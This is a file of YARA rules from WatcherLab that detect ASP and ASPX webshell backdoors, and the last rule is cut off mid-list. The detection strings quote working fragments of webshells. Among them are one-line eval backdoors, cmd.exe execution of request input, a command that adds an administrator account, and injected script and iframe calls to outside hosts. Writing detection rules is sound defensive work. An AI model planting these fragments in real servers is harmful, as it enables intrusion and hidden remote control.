rule sig_9014671e691338e1b2f1656669e100388aa23fbb
{
     meta:
        description = "asp - file 9014671e691338e1b2f1656669e100388aa23fbb.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
     strings:
        $x1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
        $x2 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x3 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
        $s4 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->" fullword ascii
        $s5 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->" fullword ascii
        $s6 = "Report = Report&\"<tr><td height=30>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s7 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s8 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>->" fullword ascii
        $s9 = "Conn.Execute(SqlStr)" fullword ascii
        $s10 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
        $s11 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
        $s12 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>" fullword ascii
        $s13 = "RRS\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&urL&\"\"\" target=\"\"FileFrame\"\">\":" fullword ascii
        $s14 = "</a></div></td></tr>\"::RRS\"<tr><td height='22'><a href='?Action=Logout' target='_top'>->" fullword ascii
        $s15 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
        $s16 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>->" fullword ascii
        $s17 = "</a></td></tr>\":End If::RRS\"<tr><td height='22'><a href='?Action=UpFile' target='FileFrame'>->" fullword ascii
        $s18 = ")</a></b></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>->" fullword ascii
        $s19 = "\",\"\",1,1,1),\"\\\",\"/\"))&\"\"\" target=_blank>\"&replace(FilePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1)&\"</a><br />\"" fullword ascii
        $s20 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=SetFileText' target='FileFrame'><b>->" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_76eb780aa625e09500563c33cfa1ec25eb00feb9
{
     meta:
        description = "asp - file 76eb780aa625e09500563c33cfa1ec25eb00feb9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b1eba04d89e6e990fd5d0acbf62e7451f33f53d8a2168ee401cfce54193f747d"
     strings:
        $s1 = "<a style=\"text-decoration: none\" target=\"_self\" href=\"klasvayv.asp?duzenle=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas" fullword ascii
        $s2 = "<form method=\"POST\" action=\"klasvayv.asp?kaydet=<%=request.querystring(\"duzenle\")%>&klas=<%=aktifklas%>\" name=\"kaypos\">" fullword ascii
        $s3 = "<form method=\"POST\" action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>\" name=\"klaspos\">" fullword ascii
        $s4 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
        $s5 = "<a href=\"klasvayv.asp?yenidosya=<%=aktifklas%>\" style=\"text-decoration: none\"><font color=\"#9F9F9F\">Yeni Dosya</font></a" fullword ascii
        $s6 = "<font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=dongu.driveletter%>:\\ ( <%=dongu.filesystem%> )</font></td>" fullword ascii
        $s7 = "<a href=\"klasvayv.asp?silklas=<%=aktifklas & oge.name & \"&klas=\" & aktifklas %>\" style=\"text-decoration: none\">" fullword ascii
        $s8 = "<a href=\"klasvayv.asp?sildos=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>\" style=\"text-decoration: none\">" fullword ascii
        $s9 = "<a href=\"klasvayv.asp?usklas=1&klas=<%=server.urlencode(left(aktifklas,(instrRev(aktifklas,\"\\\"))-1))%>\" style=\"t" fullword ascii
        $s10 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
        $s11 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
        $s12 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"yenidosya\"))%></font></" fullword ascii
        $s13 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"duzenle\"))%></font></td" fullword ascii
        $s14 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"yenidosya\"))%></font></td>" fullword ascii
        $s15 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"duzenle\"))%></font></td>" fullword ascii
        $s16 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
        $s17 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
        $s18 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
        $s19 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
        $s20 = "<a href=\"klasvayv.asp?klasac=1&aktifklas=<%=aktifklas%>\" style=\"text-decoration: none\">" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7012e8445e2ad099267936f23d8862fecd348f9b
{
     meta:
        description = "asp - file 7012e8445e2ad099267936f23d8862fecd348f9b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "eee8d35d0847411600bdcedad61724297718f5bc9d211566673a2c43f28455b4"
     strings:
        $s1 = "var sun=[73,50,114,133,114,112,130,129,114,45,127,114,126,130,114,128,129,53,47,121,47,54,50,75];" fullword ascii
        $s2 = "temp.push(sun[i]-13);" fullword ascii
        $s3 = "bk+=String.fromCharCode(temp[i]);" fullword ascii
        $s4 = "for(i=0;i<temp.length;i++)" fullword ascii
        $s5 = "var temp=new Array();" fullword ascii
     condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_46d3288717a2636bf8386ca4f3651f2e8adb17ba
{
     meta:
        description = "asp - file 46d3288717a2636bf8386ca4f3651f2e8adb17ba.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0a8e0c750cc43917fcbe279b6dd9ccacc47bb182ce03d65eac8e30975ee99567"
     strings:
        $s1 = "<%ExecuteGlobal request(\"sb\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_407d226bec41e067ad9e434e8fdfc2bb49752b7b
{
     meta:
        description = "asp - file 407d226bec41e067ad9e434e8fdfc2bb49752b7b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
        $x2 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
        $x3 = "RRS\"Zend: C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll  <br>\"" fullword ascii
        $x4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
        $s7 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
        $s8 = "RRS\"c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv <br>\"" fullword ascii
        $s9 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
        $s10 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
        $s11 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
        $s12 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
        $s13 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
        $s14 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
        $s15 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
        $s16 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\", True" fullword ascii
        $s17 = "RRS\"c:\\Program Files\\360\\360Safe\\deepscan\\Section\\mutex.db <br>\"" fullword ascii
        $s18 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
        $s19 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
        $s20 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\Rewrite.log<br>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_780ef09f01aa9850d01814cdb410fbfae753cb98
{
     meta:
        description = "asp - file 780ef09f01aa9850d01814cdb410fbfae753cb98.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e3588837df0acc50949568aa91c9c2167380eb3696aaa5b052600c27ff491dd1"
     strings:
        $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %>" fullword ascii
        $s2 = "Response.Write(eval(keng,\"unsafe\"));" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_83642a926291a499916e8c915dacadd0d5a8b91f
{
     meta:
        description = "asp - file 83642a926291a499916e8c915dacadd0d5a8b91f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "382f6cd5f2d63d1e5d15fd5d54b0cb82d09acfa7e334931bce5e312d9436dc9a"
     strings:
        $s1 = "<%=\"<input name='pass' type='password' size='10'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s2 = "' color='red'> write by EchoEye QQ:232789935 </font>\"%>" fullword ascii
        $s3 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s4 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s5 = "if request(\"pass\")=\"123\" then '" fullword ascii
        $s6 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s7 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( all of them ) ) or ( all of them )
}

rule sig_67f62eb2c0d21066ff2d5667898e7965333cec86
{
     meta:
        description = "asp - file 67f62eb2c0d21066ff2d5667898e7965333cec86.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "613c911f0c44d525c092672253ac10d8d3dc1d1de0f3f7d23f9fc0a05a213082"
     strings:
        $x1 = "if ShellPath=\"\" Then ShellPath = \"c:\\\\windows\\\\system32\\\\cmd.exe\"" fullword ascii
        $x2 = "Response.Write(\"Executed #\" & I + 1 & \" Without Error<BR><BR>\")" fullword ascii
        $s3 = "Set Rs = Conn.Execute(\"Select top 1 * from \" & sTable & \"\")" fullword ascii
        $s4 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s5 = "set RS = Conn.Execute(cstr(sQuery),intRecordsAffected)" fullword ascii
        $s6 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s7 = "Conn.Execute \"alter table \" & sTable & \" drop column \" & sField" fullword ascii
        $s8 = "\"  <tr><td class=\"\"menubar\"\"><a target=\"\"mainFrame\"\" href=\"\"?action=cmdshell\"\">DOS" fullword ascii
        $s9 = "set Rs = Conn.execute(\"Select top 1 * from \" & sTable & \"\") " fullword ascii
        $s10 = "Set Rs = Conn.Execute(sSQL)" fullword ascii
        $s11 = "Set RS = Conn.Execute(sSQL)" fullword ascii
        $s12 = "c:\\progra~1\\winrar\\rar.exe a d:\\web\\test\\web1.rar d:\\web\\test\\web1</textarea><br>\"" fullword ascii
        $s13 = "\" <TD ALIGN=\"\"Left\"\" bgcolor=\"\"#FFFFFF\"\"><input type=\"\"checkbox\"\" name=\"\"MultiExec\"\" value=\"\"yes\"\">\" & _" fullword ascii
        $s14 = "Response.Write(\"Executing #\" & I + 1 & \": \" & sSQL(i) & \"<BR>\") " fullword ascii
        $s15 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s16 = "\"<form name=\"\"loginform\"\" action=\"\"?action=login\"\" method=\"\"post\"\">\" & _" fullword ascii
        $s17 = "set rs = Conn.execute(\"EXEC sp_helpfile\")" fullword ascii
        $s18 = "Conn.Execute \"DROP PROCEDURE \" & sSP" fullword ascii
        $s19 = "Conn.Execute \"DROP VIEW \" & sView" fullword ascii
        $s20 = "Conn.Execute \"Drop Table \" & sTable" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule dee4279e0ac09c5e9edb46103fe94ae52c7572a8
{
     meta:
        description = "asp - file dee4279e0ac09c5e9edb46103fe94ae52c7572a8.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
     strings:
        $x1 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x2 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
        $s4 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
        $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s7 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s8 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
        $s9 = "RRS\".cmd{background-color:\"&color6&\";color:\"&color7&\"}\"" fullword ascii
        $s10 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
        $s11 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
        $s12 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
        $s13 = "RRS\"input,select,textarea{font-size: 12px;background-color:\"&color3&\";border:1px solid \"&color4&\"}\"" fullword ascii
        $s14 = "e=tlti' am='ssla c)'~~leFipyCo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~` ~ -b></>]<b> /ae<ov>M" fullword ascii
        $s15 = ": #00fcfc;SCROLLBAR-TRACK-COLOR: #000000;SCROLLBAR-DARKSHADOW-COLOR: #00fcfc;SCROLLBAR-BASE-COLOR: #000000}\"" fullword ascii
        $s16 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
        $s17 = "e=tlti' am='ssla c)'~~leFiitEd~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /al<De'>" fullword ascii
        $s18 = "%></body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>" fullword ascii
        $s19 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
        $s20 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_1464b6e9933d505b2f47b4791f050c6538918ba0
{
     meta:
        description = "asp - file 1464b6e9933d505b2f47b4791f050c6538918ba0.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5272491ea13c4ee8ea8d3b2da12e5dfb0058dcbca427f3f7114e0d77123d77f1"
     strings:
        $s1 = "System.IO.StreamWriter sw = new System.IO.StreamWriter(this.txtPath.Text,true,System.Text.Encoding.GetEncoding(\"gb2312\"));" fullword ascii
        $s2 = "System.IO.StreamWriter sw = new System.IO.StreamWriter(this.txtPath.Text,true,System.Text.Encoding.GetEncoding(\"gb23" fullword ascii
        $s3 = ":<asp:TextBox runat=\"server\" ID=\"txtContext\" Width=\"400px\" Height=\"250px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii
        $s4 = "if (password.Equals(this.txtPass.Text))" fullword ascii
        $s5 = "www.huc08.com</title>" fullword ascii
        $s6 = ":<asp:TextBox runat=\"server\" ID=\"txtPass\" Width=\"400px\"></asp:TextBox>" fullword ascii
        $s7 = ":<asp:TextBox runat=\"server\" ID=\"txtPath\" Width=\"400px\" ></asp:TextBox>" fullword ascii
        $s8 = "this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\"PATH_INFO\"]);" fullword ascii
        $s9 = "string password = \"TNTHK\";" fullword ascii
        $s10 = "<asp:Button runat=\"server\" ID=\"btnUpload\" text=\"" fullword ascii
        $s11 = ":<asp:Label runat=\"server\" ID=\"lblthispath\" Text=\"\"></asp:Label>" fullword ascii
        $s12 = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" validateRequest=\"false\"%>" fullword ascii
        $s13 = "<script language=\"c#\" runat=\"server\">" fullword ascii
        $s14 = "void btnUpload_Click(object sender, EventArgs e)" fullword ascii
        $s15 = "<form id=\"form1\" runat=\"server\">" fullword ascii
        $s16 = "sw.Write(this.txtContext.Text);" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule sig_9458663ad54ef1c075a6ae8ec5c818f6a912592f
{
     meta:
        description = "asp - file 9458663ad54ef1c075a6ae8ec5c818f6a912592f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ac475ae41ecd957f2e5a6aebeb327467e7b902d071afd9934e4bcdee62bdeed6"
     strings:
        $s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword ascii
        $s2 = "password:z" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_1b6a0077a761baeedf70c163f9b51ccc552c0cb8
{
     meta:
        description = "asp - file 1b6a0077a761baeedf70c163f9b51ccc552c0cb8.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b78fbdff048e1b38f22c4a3c1102c1ec4fa6d5d343cce2eec54536570e0dbf39"
     strings:
        $s1 = ":http://lpl38.com" fullword ascii
        $s2 = "P',ob1YkKUIYKwctrNnWKDhRk;4skOc*i8nsk+`YK2ctr9+6WDsRwHls+ \\mV;n,'PrEJri8)W;x1YbWUP98;tnm0c#PkWcG4sG.sR94UOMR-mV!+P{',EJrJb" fullword ascii
        $s3 = "'QbmDkKU'UmoW^Nn.LsW^[+M'J@#@&%Pw?}R!+Oja+^kmssKV[nM`!b@#@&LEPsnDtG9'hW/D@*@!Pf,lskTxxhbNN^n@*@!A@*qrUNKhk" fullword ascii
        $s4 = "YKbh+KEYvv[W1Es+UY C^V oKsNkEU kE4hrD`biESW!TZ#pJ@#@&Lr@!zkm.kaY@*E@#@&mmd+, @#@&dnY,4{?nD-nMR/D" fullword ascii
        $s5 = "~'.tnx.l~@#@&?+D~HmYm4ndP{PK4%InLA62RAa+1EOnv/Y.u:HJ#@#@&wW.,2mmt,HmOm4P(x,HCO1t+k@#@&kYD_P\\S,',InwsC1+c/D.C:HJS,HlO^4R#l^;" fullword ascii
        $s6 = "xSFSq@#@&o1{]/csrn^N/ /KEUY@#@&\"Zx\"/cI+1WM[ZKEUY@#@&]dcnlTn?by+{+T@#@&ZKEUYx]kRKlTn?byn@#@&n1x]kRKlTn;W;" fullword ascii
        $s7 = "0{B%l-Ckm.kaO)wEsswWDhcrJE[\"nhlO4`hlY4[rwJLS 1m:nbLJJrSJrZWazok^+rJbB~^^ld/{vlsB~ObYVnxE" fullword ascii
        $s8 = "YbYs+'E,PROrE_9kd2^lXINMEUZ^G13c*i6Ex1YbGx,?4WSsGs9+DvoW^N+Mb`YKwcl[N.WKDhRwGV9+.KmYt -mV;+,x,sG^N" fullword ascii
        $s9 = ":http://lpl38.com/web/jc.rar" fullword ascii
        $s10 = "=\"http://xxx.com/FileType/\"'" fullword ascii
        $s11 = "DCYbUo@!z8@*@!zY[@*@!Y[Pb[{/@*@!4,kN{6@*JlkY~HKNrWb+N@!&4@*@!zD[@*@!DN@*@!&Y[@*r@#@&sK.PAl^4,SPrU,sGV9 6ks" fullword ascii
        $s12 = "B@*@!O.@*JP@#@&wW.PAC1t~wPbxPwrd9RkE80KV[nM/@#@&jq{?qLE@!Y9P4+ro4O{FTPSrNDtxqF]PCsboU'1n" fullword ascii
        $s13 = "Jr~o1m:nbpYWa tbN+6G.:csglh+ -mV;+,Q',JEk-uuEE3fHlsnp8n^/" fullword ascii
        $s14 = "'EO+XYvPbNxv!BP7CV!+'EJGmmVzNhkUrkY.lDGDE@*@!&DN@*E@#@&LE@!JOM@*E@#@&NJ@!DD,CVboU'EmnUD+DE~\\mVkTUxBsk9Ns+v@*r@#@&Lr@!Y9@*" fullword ascii
        $s15 = ".kOn:+aY,dYMP@#@&kY: jm\\nKKobVn,sbV+`D^S ,@#@&/D: W^E/4~@#@&/Ys /VK/" fullword ascii
        $s16 = "+1@!@*9Y@!@*MY@!@*MYz@!@*NDz@!@*vXB{Y4or+4~9Y@!@*MO@!@*BTv{oxr[9l2V^n1PvZB{oxbmm2/^Vnm,BYTZFB{4Y9kh,ns4mY@!@*Owr.1/&@!)Ni" fullword ascii
        $s17 = "=\"HTTP://baidu.com/\"'" fullword ascii
        $s18 = "L@#@&?nY,Dd~{P1KOtbxo@#@&j+DPkY.+Ch,'~1KOtbxL@#@&?+O~1WUx,x,1GDtbxo@#@&AUN,?;4@#@&j;(PmMnlD+sKs[+M`DtnnCO4#@#@&Gr:,k@#@&bP'~(" fullword ascii
        $s19 = "#~r^WKxJ*@*TPKD,V^ldnvS 1mh+*'E^KWx CkwEPK.,qUkYM`V1lkn`dRHls+bSrRmTrJ*@*!,G.P&xkY.`s^m/n`d 1m:nbBJ:;hmJb@*Z~KD~&xkYDvV1C/" fullword ascii
        $s20 = "5!+dD`rnDKsbs+r#'J;WUE*~J@!8D@*J#*@*xcZPDtnx@#@&9khPmdtKhr^@#@&0G.,ldtKAb'T,YKPcZ@#@&C/4WAk1'Cd4Whb^[kwVbOcbaw^k^lOrKxcD" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule sig_75f6e8c2596d32e54a8cfbdb8847f1ea94d2a272
{
     meta:
        description = "asp - file 75f6e8c2596d32e54a8cfbdb8847f1ea94d2a272.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e5a46b04921fc39762952b29ae2048b7d18a3418e57faff395505138a0590b7e"
     strings:
        $s1 = "<% eval request(\"cmd\") %>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_0067918972472e358f261d44e95f70e974f3b7ee
{
     meta:
        description = "asp - file 0067918972472e358f261d44e95f70e974f3b7ee.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "30502171df45c790d04babd24440b79c702b27814ddfe6a9b2680e944379ebdd"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
        $x2 = "cmd.asp = Command Execution" fullword ascii
        $s3 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
        $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
        $s5 = "Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)" fullword ascii
        $s6 = "<input type=\"text\" name=\"cmd\" size=45 value=\"<%= szCMD %>\">" fullword ascii
        $s7 = "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
        $s8 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s9 = "Response.Write Server.HTMLEncode(oFile.ReadAll)" fullword ascii
        $s10 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
        $s11 = "<FORM action=\"\" method=\"GET\">" fullword ascii
        $s12 = "szCMD = request(\"cmd\")" fullword ascii
        $s13 = "Call oFileSys.DeleteFile(szTempFile, True)" fullword ascii
        $s14 = "<input type=\"submit\" value=\"Run\">" fullword ascii
     condition:
        ( uint16(0) == 0x213c and filesize < 2KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule cf87d762f286a302985c4f0e4f99bbc875ca5047
{
     meta:
        description = "asp - file cf87d762f286a302985c4f0e4f99bbc875ca5047.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7df428111122df64bb26934fd4b67d41ae62489a497a759909418a4a647ef463"
     strings:
        $s1 = "Fso.CreateTextFile(DirStr&\"\\temp.tmp\")" fullword ascii
        $s2 = "Fso.DeleteFile(DirStr&\"\\temp.tmp\")" fullword ascii
        $s3 = "<script type=\"text/javascript\" src=\"http://web.nba1001.net:8888/tj/tongji.js\"></script>" fullword ascii
        $s4 = "<input name=\"sPath\" type=\"text\" id=\"sPath\" value=\"<%=ShowPath%>\"  style=\"width:500px;height:25px\">" fullword ascii
        $s5 = "Set Fso=server.createobject(\"scr\"&\"ipt\"&\"ing\"&\".\"&\"fil\"&\"esy\"&\"ste\"&\"mob\"&\"jec\"&\"t\") " fullword ascii
        $s6 = "<form name=\"form1\" method=\"post\" action=\"\">" fullword ascii
        $s7 = "<input style=\"width:160px;height:28px\" type=\"submit\" name=\"button\" id=\"button\" value=\"" fullword ascii
        $s8 = "ShowPath=\"C:\\Program Files\\\"" fullword ascii
        $s9 = "Set Objfolder=fso.getfolder(path)" fullword ascii
        $s10 = "response.write \" <font color=red>" fullword ascii
        $s11 = "response.write \" <font color=green>" fullword ascii
